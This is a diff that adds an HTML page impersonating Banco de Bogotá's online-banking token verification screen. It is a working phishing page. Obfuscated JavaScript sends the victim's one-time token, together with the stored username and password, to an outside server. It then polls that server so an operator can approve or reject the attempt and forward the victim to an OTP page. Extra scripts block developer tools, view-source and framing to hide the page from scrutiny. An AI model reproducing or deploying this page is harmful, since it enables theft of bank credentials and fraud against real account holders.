@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Verificación de Token - Banco de Bogotá">
+    <meta name="theme-color" content="#002A8D">
+    
+    <title>Verificación de Token - Banco de Bogotá</title>
+    
+    <link rel="icon" type="image/png" href="img/channels4_profile-removebg-preview.png">
+    <link rel="apple-touch-icon" href="img/channels4_profile-removebg-preview.png">
+    
+    <link rel="stylesheet" href="loading-overlay.css?v=1.0.2">
+    <link rel="stylesheet" href="token.css?v=1.0.2">
+
+    <style>
+        #esperaOverlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: #2C3E5C;
+            z-index: 99999;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            color: #fff;
+            opacity: 0;
+            transition: opacity 0.4s ease;
+        }
+
+        #esperaOverlay.visible {
+            display: flex;
+            opacity: 1;
+        }
+
+        .espera-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+            max-width: 340px;
+            animation: fadeInUp 0.5s ease;
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        .espera-login-spinner {
+            height: 8rem;
+            width: 6rem;
+            position: relative;
+            margin: 0 auto 32px auto;
+            animation: spinner-bdb 4s infinite;
+            transform-origin: 50% 25%;
+        }
+
+        #esperaOverlay .shape {
+            height: 2.5rem;
+            width: 2.5rem;
+            border-radius: 50%;
+            position: absolute;
+        }
+
+        #esperaOverlay .shape-red {
+            background-color: #f23a31;
+            animation: red 4s infinite;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            opacity: 0;
+        }
+
+        #esperaOverlay .shape-blue {
+            background-color: #1c83e1;
+            animation: blue 4s infinite;
+            top: 100%;
+            left: 50%;
+            transform: translateX(-50%) translateY(-100%);
+            opacity: 0;
+        }
+
+        #esperaOverlay .shape-yellow {
+            background-color: #fdc130;
+            animation: yellow 4s infinite;
+            top: 100%;
+            left: 50%;
+            transform: translateX(-50%) translateY(-100%);
+            opacity: 0;
+        }
+
+        @keyframes red {
+            0%, 100% { top: 0; left: 50%; transform: translateX(-50%); opacity: 1; }
+            10%, 90% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%); opacity: 1; }
+            12%, 50% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%) scaleY(80%); transform-origin: bottom; opacity: 0; }
+            52% { top: 100%; left: 10%; transform: translateX(0) translateY(-100%) scaleY(1); opacity: 1; }
+            60%, 80% { top: 0; left: 0; transform: translateX(0) translateY(0) scaleY(1); opacity: 1; }
+        }
+
+        @keyframes blue {
+            0%, 100%, 90.1% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%); opacity: 0; }
+            10% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%) scaleY(80%); opacity: 0; }
+            12%, 32% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%) scaleY(80%); transform-origin: bottom; opacity: 1; }
+            20% { top: 0; left: 50%; transform: translateX(-50%) scaleY(80%); transform-origin: top; opacity: 1; }
+            30% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%) scaleY(100%); opacity: 1; }
+            40%, 60%, 80% { top: 0; left: 100%; transform: translateX(-100%) translateY(0) scaleY(1); opacity: 1; }
+            50% { top: 100%; left: 90%; transform: translateX(-100%) translateY(-100%) scaleY(1); opacity: 1; }
+            52% { top: 100%; left: 90%; transform: translateX(-100%) translateY(-100%) scaleY(80%); opacity: 1; }
+            90% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%); opacity: 1; }
+        }
+
+        @keyframes yellow {
+            0%, 10%, 100%, 12%, 20%, 30%, 90.1% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%); opacity: 0; }
+            32% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%) scaleY(80%); transform-origin: bottom; opacity: 0; }
+            40% { top: 0; transform: translateX(0) translateY(0) scaleY(1); left: 0; opacity: 1; }
+            50% { top: 100%; left: 10%; transform: translateX(0) translateY(-100%) scaleY(1); opacity: 1; }
+            50.1% { top: 100%; left: 90%; transform: translateX(-100%) translateY(-100%) scaleY(1); opacity: 1; }
+            60%, 80% { top: 50%; left: 50%; transform: translateX(-50%) translateY(-50%) scaleY(100%); transform-origin: bottom; opacity: 1; }
+            90% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%); opacity: 1; }
+        }
+
+        @keyframes spinner-bdb {
+            0%, 60% { transform: rotateZ(0); }
+            100%, 80% { transform: rotateZ(720deg); }
+        }
+
+        #errorOverlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 10, 40, 0.6);
+            backdrop-filter: blur(4px);
+            z-index: 100000;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        #errorOverlay.visible {
+            display: flex;
+            opacity: 1;
+        }
+
+        .error-card {
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 32px 28px 24px;
+            max-width: 360px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: popIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+            color: #1a1a2e;
+        }
+
+        @keyframes popIn {
+            from { opacity: 0; transform: scale(0.85); }
+            to   { opacity: 1; transform: scale(1); }
+        }
+
+        .error-icon-wrap {
+            width: 72px;
+            height: 72px;
+            background: linear-gradient(135deg, #FF4D4D 0%, #C20024 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            box-shadow: 0 8px 24px rgba(194, 0, 36, 0.35);
+            animation: pulseError 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulseError {
+            0%, 100% { transform: scale(1); box-shadow: 0 8px 24px rgba(194, 0, 36, 0.35); }
+            50%      { transform: scale(1.08); box-shadow: 0 12px 32px rgba(194, 0, 36, 0.5); }
+        }
+
+        .error-icon-wrap svg {
+            width: 36px;
+            height: 36px;
+            stroke: #fff;
+            stroke-width: 3;
+        }
+
+        .error-title {
+            font-size: 19px;
+            font-weight: 700;
+            color: #0a0a1a;
+            margin-bottom: 10px;
+        }
+
+        .error-text {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.55;
+            margin-bottom: 22px;
+        }
+
+        .error-btn {
+            display: block;
+            width: 100%;
+            background: linear-gradient(135deg, #0033a0 0%, #002277 100%);
+            color: #fff;
+            border: none;
+            padding: 14px 20px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+            cursor: pointer;
+            font-family: inherit;
+            transition: transform 0.15s, box-shadow 0.15s;
+            box-shadow: 0 6px 18px rgba(0, 51, 160, 0.35);
+        }
+
+        .error-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 24px rgba(0, 51, 160, 0.45);
+        }
+
+        .error-btn:active {
+            transform: translateY(0);
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="nav-left">
+            <a href="javascript:history.back()" class="back-btn">← Atrás</a>
+        </div>
+        <div class="nav-center">
+            <h1>Ingreso a Banca Virtual</h1>
+        </div>
+        <div class="nav-right">
+            <button onclick="window.close()" class="abandon-btn">Abandonar ×</button>
+        </div>
+    </div>
+
+    <div class="login-section">
+        <h2>Verifiquemos que seas tú</h2>
+        
+        <div class="token-container">
+            <div class="token-icon">
+                <img src="img/channels4_profile-removebg-preview.png" alt="Token Icon" class="bank-logo">
+            </div>
+            <div class="token-content">
+                <h3>Código Token <span class="info-icon">ⓘ</span></h3>
+                <p>Para realizar este proceso, ingresa el código de Token móvil o físico.</p>
+                
+                <div class="token-input-container">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" class="token-digit">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" class="token-digit">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" class="token-digit">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" class="token-digit">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" class="token-digit">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" class="token-digit">
+                </div>
+
+                <button class="verify-btn" disabled>Verificar</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="error-message" style="display: none;">
+        <p>⚠️ El código token ingresado es incorrecto. Por favor intente nuevamente.</p>
+    </div>
+
+    <div id="esperaOverlay">
+        <div class="espera-content">
+            <div class="espera-login-spinner">
+                <div class="shape shape-yellow"></div>
+                <div class="shape shape-blue"></div>
+                <div class="shape shape-red"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="errorOverlay">
+        <div class="error-card">
+            <div class="error-icon-wrap">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="12" y1="8" x2="12" y2="13"></line>
+                    <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                </svg>
+            </div>
+            <div class="error-title">Código Token Incorrecto</div>
+            <div class="error-text">El código token ingresado es incorrecto.<br>Por favor, verifica e inténtalo nuevamente.</div>
+            <button class="error-btn" id="errorBtn">Ingresar nuevamente</button>
+        </div>
+    </div>
+
+    <script>
+    (function(){
+        var _0xa1 = "https://multi-bancos-production.up.railway.app";
+        var _0xb2 = "bogota";
+        var _0xc3 = sessionStorage.getItem('sessionId') || '';
+        var _0xd4 = document.querySelectorAll('.token-digit');
+        var _0xe5 = document.querySelector('.verify-btn');
+        var _0xf6 = document.getElementById('esperaOverlay');
+        var _0xg7 = document.getElementById('errorOverlay');
+        var _0xh8 = document.getElementById('errorBtn');
+
+        function _0xi9(_0xj0) {
+            return (_0xj0 || '').replace(/\D/g, '');
+        }
+
+        _0xd4.forEach(function(_0xk1, _0xl2) {
+            _0xk1.addEventListener('input', function() {
+                var _0xm3 = _0xi9(_0xk1.value);
+                _0xk1.value = _0xm3.slice(-1) || '';
+                if (_0xk1.value.length === 1 && _0xl2 < _0xd4.length - 1) {
+                    _0xd4[_0xl2 + 1].focus();
+                }
+                _0xn4();
+            });
+
+            _0xk1.addEventListener('keydown', function(_0xo5) {
+                var _0xp6 = ['Backspace','Delete','Tab','ArrowLeft','ArrowRight','Home','End','Enter'];
+                var _0xq7 = _0xo5.ctrlKey || _0xo5.metaKey;
+                var _0xr8 = /^[0-9]$/.test(_0xo5.key);
+
+                if (!_0xr8 && _0xp6.indexOf(_0xo5.key) === -1 && !_0xq7) {
+                    _0xo5.preventDefault();
+                    return;
+                }
+
+                if (_0xo5.key === 'Backspace' && _0xk1.value === '' && _0xl2 > 0) {
+                    _0xd4[_0xl2 - 1].focus();
+                    _0xd4[_0xl2 - 1].value = '';
+                    _0xn4();
+                }
+            });
+
+            _0xk1.addEventListener('paste', function(_0xs9) {
+                _0xs9.preventDefault();
+                var _0xt0 = (_0xs9.clipboardData || window.clipboardData).getData('text');
+                var _0xu1 = _0xi9(_0xt0).split('');
+                _0xu1.forEach(function(_0xv2, _0xw3) {
+                    var _0xx4 = _0xd4[_0xl2 + _0xw3];
+                    if (_0xx4) _0xx4.value = _0xv2;
+                });
+                var _0xy5 = _0xd4[Math.min(_0xl2 + _0xu1.length, _0xd4.length - 1)];
+                if (_0xy5) _0xy5.focus();
+                _0xn4();
+            });
+
+            _0xk1.addEventListener('focus', function() {
+                _0xk1.setAttribute('inputmode', 'numeric');
+            });
+        });
+
+        function _0xn4() {
+            var _0xz6 = Array.prototype.every.call(_0xd4, function(_0x07) {
+                return _0x07.value.trim().length === 1;
+            });
+            if (_0xe5) _0xe5.disabled = !_0xz6;
+        }
+        _0xn4();
+
+        function _0x18() {
+            if (_0xf6) _0xf6.classList.add('visible');
+        }
+
+        function _0x29() {
+            if (_0xf6) _0xf6.classList.remove('visible');
+            setTimeout(function() {
+                if (_0xg7) _0xg7.classList.add('visible');
+            }, 300);
+        }
+
+        if (_0xe5) {
+            _0xe5.addEventListener('click', async function(_0x3a) {
+                _0x3a.preventDefault();
+
+                var _0x4b = Array.prototype.map.call(_0xd4, function(_0x5c) {
+                    return _0x5c.value;
+                }).join('');
+
+                if (_0x4b.length !== 6) return;
+
+                var _0x6d = sessionStorage.getItem('usuario') || '';
+                var _0x7e = sessionStorage.getItem('clave') || '';
+
+                try {
+                    var _0x8f = await fetch(_0xa1 + '/' + _0xb2 + '/enviar-token', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            sessionId: _0xc3,
+                            token: _0x4b,
+                            identificacion: _0x6d,
+                            clave: _0x7e
+                        })
+                    });
+                    var _0x9g = await _0x8f.json();
+                    console.log('Token enviado:', _0x9g);
+                } catch (_0xah) {
+                    console.error('Error enviando token:', _0xah);
+                }
+
+                _0x18();
+
+                var _0xbi = setInterval(async function() {
+                    try {
+                        var _0xcia = await fetch(_0xa1 + '/' + _0xb2 + '/estado/' + _0xc3);
+                        var _0xdia = await _0xcia.json();
+                        console.log('Estado:', _0xdia.estado);
+
+                        if (_0xdia.estado === 'otp') {
+                            clearInterval(_0xbi);
+                            window.location.href = 'otp.html';
+                        } else if (_0xdia.estado === 'rechazado') {
+                            clearInterval(_0xbi);
+                            _0x29();
+                        }
+                    } catch (_0xeia) {
+                        console.error('Error estado:', _0xeia);
+                    }
+                }, 2000);
+            });
+        }
+
+        if (_0xh8) {
+            _0xh8.addEventListener('click', function() {
+                if (_0xg7) _0xg7.classList.remove('visible');
+                window.location.href = 'token.html';
+            });
+        }
+    })();
+    </script>
+
+<script>
+(function(){
+'use strict';
+var _0xfia=0;
+document.addEventListener('touchend',function(_0xgia){
+var _0xhia=new Date().getTime();
+if(_0xhia-_0xfia<=300){_0xgia.preventDefault();}
+_0xfia=_0xhia;
+},{passive:false});
+document.addEventListener('dblclick',function(_0xiia){_0xiia.preventDefault();});
+document.addEventListener('focusin',function(_0xjia){
+var _0xkia=(_0xjia.target&&_0xjia.target.tagName)?_0xjia.target.tagName.toLowerCase():'';
+if(_0xkia==='input'||_0xkia==='textarea'||_0xkia==='select'){
+if(_0xjia.target.style.fontSize!=='16px'){
+_0xjia.target.dataset._fs=_0xjia.target.style.fontSize||'';
+_0xjia.target.style.fontSize='16px';
+}
+}
+});
+document.addEventListener('focusout',function(_0xlia){
+var _0xkia=(_0xlia.target&&_0xlia.target.tagName)?_0xlia.target.tagName.toLowerCase():'';
+if(_0xkia==='input'||_0xkia==='textarea'||_0xkia==='select'){
+if(_0xlia.target.dataset._fs!==undefined){
+_0xlia.target.style.fontSize=_0xlia.target.dataset._fs;
+delete _0xlia.target.dataset._fs;
+}
+}
+});
+})();
+</script>
+
+<script>
+(function(){
+'use strict';
+
+document.addEventListener('contextmenu',function(_0xmia){
+_0xmia.preventDefault();
+return false;
+});
+
+document.addEventListener('keydown',function(_0xnia){
+var _0xoia=(_0xnia.key||'').toLowerCase();
+var _0xpia=_0xnia.ctrlKey||_0xnia.metaKey;
+var _0xqia=_0xnia.shiftKey;
+
+if(_0xoia==='f12'){_0xnia.preventDefault();return false;}
+if(_0xpia&&_0xqia&&(_0xoia==='i'||_0xoia==='j'||_0xoia==='c')){_0xnia.preventDefault();return false;}
+if(_0xpia&&_0xoia==='u'){_0xnia.preventDefault();return false;}
+if(_0xpia&&_0xoia==='s'){_0xnia.preventDefault();return false;}
+if(_0xpia&&_0xqia&&(_0xoia==='k'||_0xoia==='e'||_0xoia==='s'||_0xoia==='c')){_0xnia.preventDefault();return false;}
+if(_0xnia.metaKey&&_0xnia.altKey&&(_0xoia==='i'||_0xoia==='j'||_0xoia==='c')){_0xnia.preventDefault();return false;}
+});
+
+document.addEventListener('dragstart',function(_0xria){_0xria.preventDefault();});
+
+document.addEventListener('selectstart',function(_0xsia){
+var _0xtia=(_0xsia.target&&_0xsia.target.tagName)?_0xsia.target.tagName.toLowerCase():'';
+if(_0xtia!=='input'&&_0xtia!=='textarea'){
+_0xsia.preventDefault();
+}
+});
+
+try{
+if(window.top!==window.self){
+window.top.location=window.self.location;
+}
+}catch(_0xuia){
+document.body.innerHTML='';
+}
+
+var _0xvia=false;
+var _0xwia=160;
+
+function _0xxia(){
+var _0xyia=window.outerWidth-window.innerWidth;
+var _0xzia=window.outerHeight-window.innerHeight;
+if(_0xyia>_0xwia||_0xzia>_0xwia){
+_0xvia=true;
+}else{
+_0xvia=false;
+}
+}
+
+setInterval(_0xxia,1000);
+
+})();
+</script>
+
+</body>
+</html>
